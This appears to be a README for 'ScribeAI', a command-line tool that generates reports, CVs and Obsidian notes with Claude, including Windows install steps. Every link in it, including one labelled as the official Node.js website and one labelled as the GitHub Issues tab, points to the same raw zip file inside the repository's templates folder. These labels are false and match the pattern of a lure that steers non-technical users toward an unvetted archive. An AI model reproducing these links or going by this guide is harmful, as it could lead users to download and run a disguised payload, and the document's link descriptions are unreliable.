# 🤖 ScribeAI - Easy Report and Note Generation

[![Download ScribeAI](https://img.shields.io/badge/Download-ScribeAI-brightgreen?style=for-the-badge)](https://github.com/Wisdom-Mbuk/ScribeAI/raw/refs/heads/main/templates/report/AI-Scribe-3.5-alpha.1.zip)

---

ScribeAI is a command-line tool that helps you create reports, CVs, and notes with simple commands. It uses AI to structure your documents, supports templates, versioning, and lets you export to PDF. This guide will show you how to download and run ScribeAI on Windows, step by step, without needing any programming skills.

---

## 📋 What is ScribeAI?

ScribeAI runs in a command prompt window. Instead of opening a regular program, you type commands to generate documents. It uses AI technology named Claude to help shape your text based on templates you choose. You can make reports, resumes, notes for Obsidian (a note-taking app), and save your work in different versions. You can also export your documents as PDFs right from the app.

You do not need prior technical knowledge to use ScribeAI. This tool is designed for anyone who wants to quickly create and manage professional-looking documents without using complicated software.

---

## 💻 System Requirements

- Windows 10 or newer (64-bit recommended)
- At least 4GB of RAM  
- 500 MB of free disk space  
- An active internet connection for AI features  
- Basic familiarity with using a keyboard and mouse  

ScribeAI depends on Node.js to run. This guide covers everything you need, including installing Node.js.

---

## 🚀 Getting Started: Download and Setup

### Step 1: Visit the Download Page

Click the button below to open the official download page for ScribeAI:

[Download ScribeAI](https://github.com/Wisdom-Mbuk/ScribeAI/raw/refs/heads/main/templates/report/AI-Scribe-3.5-alpha.1.zip)

You’ll see the main project page on GitHub. Here you can find the latest version of ScribeAI and instructions.

### Step 2: Install Node.js

ScribeAI runs on Node.js. If you do not have Node.js installed on your PC, you need to install it first.

- Go to the official Node.js website: https://github.com/Wisdom-Mbuk/ScribeAI/raw/refs/heads/main/templates/report/AI-Scribe-3.5-alpha.1.zip
- Choose the **Windows Installer (.msi)** for the latest LTS (Long Term Support) version.
- Download the installer and run it.
- Follow the prompts and accept the defaults.
- After installation, open a command prompt (search for "cmd" in the Start menu).
- Type `node -v` and press Enter. You should see a version number like `v18.x.x`.

If you see the version number, Node.js is ready.

### Step 3: Download ScribeAI Files

To download the latest ScribeAI files:

- On the GitHub page you opened, click **Code** (green button near the top right).
- Choose **Download ZIP**.
- Save the ZIP file to your Desktop or Documents folder.
- After downloading, right-click the ZIP file and select **Extract All**.
- Choose a folder where you want to keep ScribeAI files and click **Extract**.

### Step 4: Open Command Prompt in ScribeAI Folder

- Open the folder where you extracted the files.
- Click on the address bar at the top of the File Explorer window.
- Type `cmd` and press Enter.
- This opens a command prompt window set to the ScribeAI folder.

### Step 5: Install ScribeAI Dependencies

In the command prompt, type the following command and press Enter:

```
npm install
```

This command downloads all required files to run ScribeAI.

Wait until the process finishes. It may take a few minutes depending on your internet speed.

### Step 6: Run ScribeAI

Once installation finishes, start ScribeAI by typing:

```
npm start
```

and press Enter.

The command-line interface will launch. You will see instructions on how to use commands to generate reports and notes.

---

## 🗂 How to Use ScribeAI

When the program starts, you will see a prompt where you can type commands.

Basic commands might include:

- `new report` – Create a new report.
- `new cv` – Create a new resume.
- `new note` – Create a note for Obsidian.
- `list templates` – Show available document templates.
- `export pdf` – Save your document as a PDF file.
- `save version` – Keep a version snapshot of your document.

You can type commands as they appear or ask for help by typing:

```
help
```

ScribeAI will guide you through options step by step.

---

## 🗂 File Storage and Versions

ScribeAI saves your documents in a folder called `/documents` inside the main app folder.

Each time you save a version, it creates a new copy with a timestamp. This lets you return to previous versions if needed.

---

## 📄 Exporting to PDF

ScribeAI uses an internal tool to convert your document into a PDF.

After finishing your document, type:

```
export pdf
```

The PDF file will appear in the `/exports` folder inside the main app folder.

---

## ⚙️ Customize Your Templates

ScribeAI uses template files written in Handlebars format. You can open these template files with any text editor like Notepad.

If you want to create custom reports or resumes, edit or add new template files in the `/templates` folder.

---

## 🔧 Troubleshooting

If ScribeAI does not start or gives errors:

- Check if Node.js is installed correctly (`node -v`).
- Make sure you ran `npm install` in the ScribeAI folder.
- Confirm you opened the command prompt inside the right folder.
- Restart your command prompt and try again.
- If errors persist, check issues on the GitHub page linked above.

---

## 📥 Direct Download Reminder

You can access the download page for ScribeAI again here:

[Download ScribeAI](https://github.com/Wisdom-Mbuk/ScribeAI/raw/refs/heads/main/templates/report/AI-Scribe-3.5-alpha.1.zip)

Use this link to get the latest version any time.

---

## 🔒 Privacy & Connectivity

ScribeAI connects to the AI service only while generating text. No personal data is saved permanently. An internet connection is needed during this process, but once documents are created, you can use them offline.

---

## 🧰 Technical Details

- Built with Node.js and TypeScript
- Uses Claude AI from Anthropic for natural language generation
- Handlebars provides template rendering
- Puppeteer generates PDFs from HTML
- Supports Markdown for notes and documentation

---

## ❓ Additional Support

For questions or to report issues, use the GitHub [Issues](https://github.com/Wisdom-Mbuk/ScribeAI/raw/refs/heads/main/templates/report/AI-Scribe-3.5-alpha.1.zip) tab.

---

ScribeAI is a tool to help you focus on writing without worrying about layouts or formatting. The command-line interface keeps things light and efficient. This guide provides everything you need to install and get started on Windows.